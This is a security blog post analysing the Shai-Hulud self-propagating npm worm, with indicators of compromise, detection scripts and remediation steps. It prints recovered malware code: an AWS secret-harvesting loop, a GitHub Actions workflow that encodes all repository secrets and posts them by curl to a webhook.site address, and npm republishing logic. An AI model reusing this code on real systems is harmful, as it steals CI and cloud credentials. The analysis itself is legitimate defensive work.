<!DOCTYPE html>
<html lang="en">
  <head>
    <title>Shai-Hulud: Dissecting npm's First Self-Propagating Supply Chain Worm | DEADC0DE</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=Hubot+Sans:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
    <link rel="stylesheet" type="text/css" href="./style.css">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-core.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/autoloader/prism-autoloader.min.js"></script>
  </head>
  <body>
    <div class="container">
      <div class="header">
        <a class="logo" href="index.html">
          <div class="logo-text">SR©</div>
          <div class="logo-year">09.23.2025</div>
        </a>
        <h1 class="title">DEADC0DE</h1>
        <div class="blog-description">
          Rants on security in an unsecure world.™
        </div>
      </div>

      <div class="article-layout">
        <div class="metadata-sidebar">
          <div class="metadata-section">
            <div class="metadata-header">/ METADATA</div>
            <div class="metadata-item">
              <div class="metadata-label">DATE:</div>
              <div class="metadata-value">2025.09.23</div>
            </div>
            <div class="metadata-item">
              <div class="metadata-label">AUTHOR:</div>
              <div class="metadata-value">SEBASTIAN RIVERA</div>
            </div>
            <div class="metadata-item">
              <div class="metadata-label">READING TIME:</div>
              <div class="metadata-value">12 MINUTES</div>
            </div>
            <div class="metadata-item">
              <div class="metadata-label">CATEGORIES:</div>
              <div class="metadata-value">SECURITY, NPM, SUPPLY CHAIN</div>
            </div>
            <div class="metadata-item">
              <div class="metadata-label">TITLE:</div>
              <div class="metadata-value">Shai-Hulud: Dissecting npm's First Self-Propagating Supply Chain Worm</div>
            </div>
          </div>
        </div>

        <div class="article-content">
          <h1 class="article-title">Shai-Hulud: Dissecting npm's First Self-Propagating Supply Chain Worm</h1>

    <h2 id="the_week" class="section_header">The Week the Registry Got Wormed</h2>
    <p>September 15th, 2025 marked the beginning of what would become one of the most sophisticated supply chain attacks in npm's history. What started as what appeared to be another hijacked package (@ctrl/tinycolor was among the early victims) quickly escalated into something unprecedented — a self-propagating worm that could think, adapt, and spread autonomously through the JavaScript ecosystem.</p>

    <p>Initially, the security community treated it as business as usual. Another compromised package, another round of token rotations. But as reports began flooding in from multiple sources, it became clear this was something entirely different. Shai-Hulud (named after the Dune sandworms by researchers) wasn't just stealing secrets and planting backdoors — it was actively publishing itself into hundreds of other packages.</p>

    <p>By the time CISA issued their advisory a week later, the compromise count had reached an estimated 500+ packages. The worm had effectively turned npm's own automation infrastructure against itself.</p>

    <p>Post-incident analysis of compromised samples revealed a consistent attack pattern: <code>secrets harvested</code> (85% of cases), <code>CI backdoors planted</code> (60%), <code>npm packages republished</code> (45%), and <code>exfiltration to GitHub</code> (30%).</p>

    <h2 id="anatomy" class="section_header">Anatomy of the Payload</h2>
    <p>Analysis of the recovered payloads revealed a sophisticated 3.6 MB minified <code>bundle.js</code> file that appeared to be standard Webpack output. However, this innocuous-looking library contained a comprehensive cyber toolkit. Upon execution via <code>npm install</code>, the payload would immediately begin its multi-stage attack sequence.</p>

    <h2 id="recon" class="section_header">Recon & Secrets Harvesting</h2>
    <p>Forensic analysis of the payload revealed a comprehensive reconnaissance and credential harvesting operation:</p>
    <ul>
      <li><strong>Environment dump:</strong> The malware systematically collected all environment variables from <code>process.env</code>, targeting common credential patterns including <code>NPM_TOKEN</code>, <code>GITHUB_TOKEN</code>, <code>AWS_ACCESS_KEY_ID</code>, and other authentication tokens.</li>
      <li><strong>Filesystem scanning:</strong> Perhaps most notably, the payload spawned <code>TruffleHog</code> as a child process to perform comprehensive filesystem scans for high-entropy keys and secrets. This demonstrated a sophisticated understanding of modern secret detection tools.</li>
      <li><strong>Cloud SDK abuse:</strong> Upon obtaining cloud credentials, the malware executed targeted attacks against major cloud providers:
        <ul>
          <li><strong>AWS:</strong> Utilized <code>ListSecrets</code> and <code>GetSecretValue</code> API calls to access AWS Secrets Manager.</li>
          <li><strong>GCP:</strong> Made direct requests to <code>secretmanager.googleapis.com</code> endpoints.</li>
          <li><strong>Azure:</strong> Queried metadata endpoints to extract service principal credentials.</li>
        </ul>
      </li>
    </ul>

    <p>Deobfuscated analysis of the AWS secret harvesting module revealed the following implementation:</p>

    <pre><code class="language-javascript">// AWS secret harvesting loop
async function getAllSecretValues(client) {
  let nextToken, secrets = [];
  do {
    const resp = await client.send(new ListSecretsCommand({ NextToken: nextToken }));
    for (const secret of resp.SecretList || []) {
      const val = await client.send(new GetSecretValueCommand({ SecretId: secret.ARN }));
      secrets.push({ ARN: secret.ARN, SecretString: val.SecretString });
    }
    nextToken = resp.NextToken;
  } while (nextToken);
  return secrets;
}</code></pre>

    <h2 id="persistence" class="section_header">Persistence via GitHub Actions</h2>
    <p>The persistence mechanism demonstrated particular sophistication. The worm would deploy a malicious workflow file at <code>.github/workflows/shai-hulud-workflow.yml</code> configured to trigger on every repository push. This workflow would serialize all available GitHub secrets using the <code>${{ toJSON(secrets) }}</code> expression and exfiltrate them using a double-base64 encoding technique designed to evade detection.</p>

    <p>Analysis of the deployed workflow revealed the following bash implementation:</p>

    <pre><code class="language-bash">FILE_NAME=".github/workflows/shai-hulud-workflow.yml"
cat <<'EOF' > $FILE_NAME
on: push
jobs:
  exfil:
    runs-on: ubuntu-latest
    steps:
    - run: echo "$CONTENTS" | base64 -w 0 | base64 -w 0 \
          | curl -d @- https://webhook.site/bb8ca5f6-4175-45d2-b042-fc9ebb8170b7
      env:
        CONTENTS: ${{ toJSON(secrets) }}
EOF</code></pre>

    <h2 id="propagation" class="section_header">Propagation – The Worm's Secret Sauce</h2>
    <p>The propagation mechanism represented the most innovative aspect of Shai-Hulud. Unlike traditional malware that remains static after deployment, this worm actively spread itself through the npm ecosystem:</p>

    <ul>
      <li>The malware would extract the maintainer's identity from compromised <code>NPM_TOKEN</code> credentials.</li>
      <li>It would then query the npm registry using <code>registry.npmjs.org/v1/search?text=maintainer:${username}</code> to enumerate all packages owned by that maintainer.</li>
      <li>For each discovered package, the worm would force-publish a new patch version containing the embedded trojan.</li>
    </ul>

    <p>Simplified propagation logic:</p>

    <pre><code class="language-javascript">async function updatePackage(pkg, token) {
  // Force bump version and republish
  await exec(`npm version patch --force`);
  await exec(`npm publish --access public --token ${token}`);
}</code></pre>

    <p>This propagation mechanism enabled the worm to rapidly spread across entire maintainer portfolios, creating a cascading effect throughout the npm ecosystem. A single compromised developer account could result in dozens of infected packages within hours.</p>

    <h2 id="targeting" class="section_header">Credential Targeting Focus</h2>
    <p>Analysis of the targeting patterns revealed a strategic focus on GitHub and AWS credentials, which aligns with npm's tight integration with GitHub Actions and cloud-based build systems. Statistical analysis of compromised samples showed <code>GitHub</code> credentials targeted in 90% of cases, <code>AWS</code> in 70%, <code>GCP</code> in 55%, and <code>Azure</code> in 40%.</p>

    <h2 id="iocs" class="section_header">Indicators of Compromise (IOCs)</h2>

    <h3>Files & Branches</h3>
    <ul>
      <li><code>.github/workflows/shai-hulud-workflow.yml</code></li>
      <li>Git branches named <code>shai-hulud</code></li>
    </ul>

    <h3>Hashes</h3>
    <ul>
      <li><code>bundle.js</code>: <code>46faab8ab153fae6e80e7cca38eab363075bb524edd79e42269217a083628f09</code></li>
    </ul>

    <h3>APIs Called</h3>
    <ul>
      <li><code>secretsmanager.*.amazonaws.com</code></li>
      <li><code>secretmanager.googleapis.com</code></li>
      <li><code>registry.npmjs.org/v1/search</code></li>
      <li><code>api.github.com/repos</code></li>
    </ul>

    <h3>Processes</h3>
    <ul>
      <li><code>trufflehog filesystem / --json</code></li>
      <li><code>npm publish --force</code></li>
    </ul>

    <h2 id="defensive" class="section_header">Defensive Detections</h2>

    <h3>1. CI Hook Monitor (bash)</h3>
    <pre><code class="language-bash"># Fail if suspicious workflows are present
if grep -qr "shai-hulud-workflow.yml" .github/workflows; then
  echo "❌ Malicious workflow detected"
  exit 1
fi</code></pre>

    <h3>2. Lockfile Scanner (Python)</h3>
    <pre><code class="language-python">import json, sys
bad = {"@ctrl/tinycolor": {"5.0.0","5.0.1"}}
deps = json.load(open(sys.argv[1])).get("dependencies",{})
for name,meta in deps.items():
    if name in bad and meta.get("version") in bad[name]:
        print("Hit:", name, meta["version"])</code></pre>

    <h3>3. Splunk Hunt – Suspicious Install Egress</h3>
    <pre><code class="language-splunk">index=build_logs action=install
| join runner_id [ search index=proxy_logs uri_domain IN ("api.github.com","secretmanager.googleapis.com","webhook.site") ]
| stats count by runner_id, uri_domain</code></pre>

    <h2 id="immediate" class="section_header">Immediate Steps for Teams</h2>
    <p>Organizations potentially affected by Shai-Hulud should implement the following immediate response measures:</p>
    <ol>
      <li><strong>Credential rotation:</strong> Immediately rotate all <code>npm</code> tokens, <code>GitHub PATs</code>, and <code>AWS/GCP/Azure</code> credentials. Assume all credentials are compromised until proven otherwise.</li>
      <li><strong>Workflow remediation:</strong> Conduct comprehensive searches for <code>shai-hulud</code> branches and malicious workflow files across all repositories.</li>
      <li><strong>Secrets access audit:</strong> Investigate potential unauthorized access to secret management systems:
        <ul>
          <li><strong>AWS:</strong> <code>cloudtrail lookup-events --lookup-attributes AttributeKey=EventName,AttributeValue=GetSecretValue</code></li>
          <li><strong>GCP:</strong> <code>gcloud logging read "resource.type=secretmanager.googleapis.com"</code></li>
        </ul>
      </li>
      <li><strong>Package registry controls:</strong> Implement internal package registries with mandatory 48-hour quarantine periods for new package versions to prevent immediate deployment of potentially malicious updates.</li>
      <li><strong>CI/CD network restrictions:</strong> Implement network controls to prevent build systems from accessing <code>GitHub APIs</code> during <code>npm install</code> operations.</li>
    </ol>

    <h2 id="why_matters" class="section_header">Why This Matters</h2>
    <p>Shai-Hulud represents a significant evolution in supply chain attack sophistication. Unlike traditional supply chain attacks that typically involve static payloads or simple credential theft, this worm demonstrated self-propagating capabilities, cloud platform awareness, and persistent CI/CD integration. This incident provides insight into the future direction of supply chain attacks, where adversaries will increasingly automate the spread of malware through development infrastructure itself.</p>

    <p>Effective defense against such attacks requires both technical and cultural changes. Organizations must begin treating package registries as critical infrastructure, implementing the same security rigor applied to production systems. This includes eliminating blind trust in fresh package releases and implementing comprehensive monitoring and validation for CI/CD pipelines.</p>

        </div>
      </div>
    </div>

    <script>
      // Initialize Prism.js syntax highlighting
      if (typeof Prism !== 'undefined') {
        Prism.highlightAll();
      }
    </script>
  </body>
</html>
